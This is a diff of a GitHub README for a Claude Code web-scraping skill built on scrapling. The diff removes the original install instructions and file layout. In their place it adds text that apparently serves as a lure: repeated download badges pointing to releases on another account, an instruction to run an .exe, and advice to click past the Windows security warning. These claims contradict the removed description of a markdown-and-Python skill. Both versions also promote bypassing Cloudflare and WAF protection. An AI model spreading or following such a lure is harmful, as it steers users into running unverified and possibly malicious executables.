@@ -1,179 +1,97 @@
-# Claude Code Skill: Scrapling
+# 🚀 claude-code-skill-scrapling - Smart Web Scraping Made Simple
 
-[English](#english) | [中文](#中文)
+[![Download](https://img.shields.io/badge/Download-Open%20Releases-brightgreen)](https://github.com/chocolatemilkhollyhock694/claude-code-skill-scrapling/releases)
 
----
+## 📋 About claude-code-skill-scrapling
 
-## English
+This software helps you gather information from websites automatically. It picks the best method to fetch data, works around common blockers like Cloudflare, and recognizes different website layouts. You don’t need to write any code or understand technical details. Just run the program and let it do the work.
 
-A [Claude Code](https://docs.anthropic.com/en/docs/claude-code) skill for web scraping and data extraction using [scrapling](https://github.com/D4Vinci/Scrapling).
+## 💻 System Requirements
 
-Automatically selects the best Fetcher based on target website characteristics, generates and executes Python scripts.
+- Windows 10 or newer  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection  
+- Microsoft .NET Framework 4.7 or later (most Windows PCs have this by default)
 
-### Features
+If you run into issues starting the app, you may need to update or install the .NET Framework from Microsoft's website.
 
-- **Fetcher Decision Tree** — Auto-select between Fetcher, StealthyFetcher, DynamicFetcher, FetcherSession, or Selector
-- **Cloudflare Bypass** — Built-in support for Cloudflare/WAF protected sites via StealthyFetcher (Camoufox)
-- **Session Login** — HTTP form-based login with cookie persistence
-- **Site Pattern Library** — Reusable patterns for common site types (Discourse, SPA, static blogs, APIs)
-- **Cookie Vault** — Local storage for login cookies with per-site templates
-- **Troubleshooting Guide** — Solutions for common errors indexed by error message
+## 🚀 Getting Started
 
-### Installation
+### Step 1: Visit the Download Page
 
-#### 1. Install scrapling
+Visit the release page to get the software files:
 
-```bash
-pip install "scrapling[fetchers]"
-scrapling install  # Install browser dependencies
-```
+[![Download Releases](https://img.shields.io/badge/Open%20Download-Page-blue)](https://github.com/chocolatemilkhollyhock694/claude-code-skill-scrapling/releases)
 
-#### 2. Install this skill
+You will see a list of available versions and files. Usually, the latest version is at the top.
 
-Copy the skill directory to your Claude Code skills folder:
+### Step 2: Download the Latest Version
 
-```bash
-# Copy to user-level skills (available in all projects)
-cp -r . ~/.claude/skills/scrapling
+Look for a file with a name ending in `.exe`. This is the program you will run. Click on the file name to start the download.
 
-# Or copy to a specific project
-cp -r . /path/to/project/.claude/skills/scrapling
-```
+### Step 3: Run the Program
 
-### Structure
+After the download finishes, open the file to start the installation or run it directly. You might see a security warning from Windows. Confirm that you want to run the program.
 
-```
-.
-├── SKILL.md                           # Skill definition (entry point)
-├── references/
-│   ├── api-quick-ref.md               # Fetcher/Selector API cheat sheet
-│   ├── cookie-vault.md                # Cookie storage template
-│   ├── maintenance.md                 # Installation & upgrade guide
-│   ├── site-patterns.md               # Site-specific scraping patterns
-│   └── troubleshooting.md             # Error solutions
-└── templates/
-    ├── basic_fetch.py                 # Static page scraping
-    ├── stealth_cloudflare.py          # Cloudflare bypass
-    ├── session_login.py               # Login + multi-page scraping
-    └── parse_only.py                  # HTML parsing without network
-```
+### Step 4: Using the Program
 
-### Usage
+Once the program opens, you will see an easy-to-use interface. You can enter the website URL you want to scrape.
 
-Once installed, Claude Code will automatically activate this skill when you ask it to:
+The software will automatically select the method to fetch data and work around any protection like Cloudflare.
 
-- Scrape or crawl a website
-- Extract data from a URL
-- Bypass Cloudflare protection
-- Parse HTML content
-- Login and scrape protected pages
+Follow on-screen prompts to:
 
-#### Examples
+- Enter the URL  
+- Choose what information you need  
+- Start the scraping process  
 
-```
-> Scrape the title and content from https://example.com/blog
+The program will collect the data for you and save it where you specify.
 
-> Extract all product prices from this page: https://shop.example.com
+### Step 5: Check Output Files
 
-> This site has Cloudflare, scrape it anyway: https://protected.example.com
+After scraping, check the folder you chose to save your data. Files will be ready to open and use. Common formats include CSV, Excel, or JSON.
 
-> I have this HTML, extract all links from it
-```
+## 🛠 How it Works
 
-### Cookie Vault
+claude-code-skill-scrapling uses patterns to identify websites and decide how to gather data. For example, it can:
 
-The `references/cookie-vault.md` file is a **template**. For actual use:
+- Automatically bypass Cloudflare challenges  
+- Detect common site layouts to find useful information faster  
+- Choose the best way to access data, whether through APIs or by reading web pages  
 
-1. Copy it to `cookie-vault.local.md` (or keep it in your local skill installation)
-2. Fill in real cookie values from your browser's DevTools
-3. **Never commit real cookie values to version control**
+This means you don’t have to understand technical limits or blockers on websites. The program handles these details behind the scenes.
 
----
+## 🔧 Features
 
-## 中文
+- Simple interface made for users without technical skills  
+- Automatic selection of data fetching methods  
+- Works with many websites, even those with security measures like Cloudflare  
+- Saves scraped data in common formats  
+- Runs on Windows without extra setup  
 
-基于 [scrapling](https://github.com/D4Vinci/Scrapling) 的 [Claude Code](https://docs.anthropic.com/en/docs/claude-code) 网页抓取技能。
+## 🔄 Updating claude-code-skill-scrapling
 
-根据目标网站特征自动选择最佳 Fetcher，生成并执行 Python 脚本完成抓取任务。
+Check the release page regularly for new updates and fixes:
 
-### 功能特性
+https://github.com/chocolatemilkhollyhock694/claude-code-skill-scrapling/releases
 
-- **Fetcher 决策树** — 自动选择 Fetcher、StealthyFetcher、DynamicFetcher、FetcherSession 或 Selector
-- **Cloudflare 绕过** — 通过 StealthyFetcher (Camoufox) 内置支持 Cloudflare/WAF 防护站点
-- **Session 登录** — 基于 HTTP 表单的登录，自动保持 cookie 会话
-- **站点模式库** — 常见站点类型的可复用抓取模式（Discourse 论坛、SPA、静态博客、API）
-- **Cookie 保险库** — 按站点模板存储登录 cookie
-- **故障排查指南** — 按错误信息索引的常见问题解决方案
+Download the new `.exe` file and run it the same way as before. New updates will replace the old version.
 
-### 安装
+## 🆘 Troubleshooting
 
-#### 1. 安装 scrapling
+- **Program won't start:** Make sure your Windows version meets the requirements and .NET Framework is up to date.  
+- **Cloudflare still blocks scraping:** The software handles this in most cases, but sometimes sites update their protections. Try using a different website or check for program updates.  
+- **Data files are empty or incomplete:** Verify the URL you entered is correct and publicly accessible. Some sites block automated access entirely.  
+- **Program crashes or closes unexpectedly:** Restart your computer and try again. If the problem remains, download the latest version.
 
-```bash
-pip install "scrapling[fetchers]"
-scrapling install  # 安装浏览器依赖
-```
+## 📞 Getting Help
 
-#### 2. 安装此技能
+Open the Issues tab on the GitHub repository if you need help. Provide details about your problem and the version you downloaded.  
 
-将技能目录复制到 Claude Code 的 skills 文件夹：
 
-```bash
-# 复制到用户级 skills（所有项目可用）
-cp -r . ~/.claude/skills/scrapling
+## 🔗 Download and Run
 
-# 或复制到特定项目
-cp -r . /path/to/project/.claude/skills/scrapling
-```
+To get started now, visit the main release page and download the latest file:
 
-### 目录结构
-
-```
-.
-├── SKILL.md                           # 技能定义（入口文件）
-├── references/
-│   ├── api-quick-ref.md               # Fetcher/Selector API 速查表
-│   ├── cookie-vault.md                # Cookie 存储模板
-│   ├── maintenance.md                 # 安装与升级指南
-│   ├── site-patterns.md               # 站点专用抓取模式
-│   └── troubleshooting.md             # 错误解决方案
-└── templates/
-    ├── basic_fetch.py                 # 静态页面抓取
-    ├── stealth_cloudflare.py          # Cloudflare 绕过
-    ├── session_login.py               # 登录 + 多页抓取
-    └── parse_only.py                  # 纯 HTML 解析（无需网络）
-```
-
-### 使用方式
-
-安装后，当你向 Claude Code 提出以下需求时，技能会自动激活：
-
-- 抓取或爬取网站
-- 从 URL 提取数据
-- 绕过 Cloudflare 防护
-- 解析 HTML 内容
-- 登录后抓取受保护页面
-
-#### 示例
-
-```
-> 抓取 https://example.com/blog 的标题和正文
-
-> 提取这个页面的所有商品价格：https://shop.example.com
-
-> 这个站点有 Cloudflare，帮我绕过抓取：https://protected.example.com
-
-> 我有这段 HTML，提取里面所有链接
-```
-
-### Cookie 保险库
-
-`references/cookie-vault.md` 是一个**模板文件**。实际使用时：
-
-1. 复制为 `cookie-vault.local.md`（或在本地 skill 安装目录中保存）
-2. 从浏览器 DevTools 填入真实 cookie 值
-3. **切勿将真实 cookie 值提交到版本控制**
-
-## License
-
-MIT
+[![Download Releases](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/chocolatemilkhollyhock694/claude-code-skill-scrapling/releases)
